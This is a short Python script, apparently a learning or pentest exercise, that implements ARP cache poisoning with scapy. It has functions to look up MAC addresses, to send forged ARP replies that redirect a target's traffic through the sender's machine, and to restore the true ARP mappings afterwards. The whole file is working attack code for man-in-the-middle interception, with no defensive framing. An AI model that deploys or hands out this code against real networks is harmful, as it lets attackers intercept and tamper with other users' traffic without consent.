#!/usr/bin/env python3
import scapy.all as scapy

def get_mac(ip):
    """
    Returns the MAC address for a given IP by sending an ARP request.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    """
    Sends an ARP reply to the target_ip claiming that spoof_ip is at our MAC address.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not find MAC for {target_ip}, skipping spoof.")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    Sends the correct ARP reply to restore the ARP table of the destination IP.
    """
    dest_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)
    if not dest_mac or not src_mac:
        print("[!] Could not restore ARP table - MAC address missing.")
        return
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=dest_mac,
        psrc=source_ip,
        hwsrc=src_mac
    )
    # Send multiple times to ensure the table is updated
    scapy.send(packet, count=3, verbose=False)
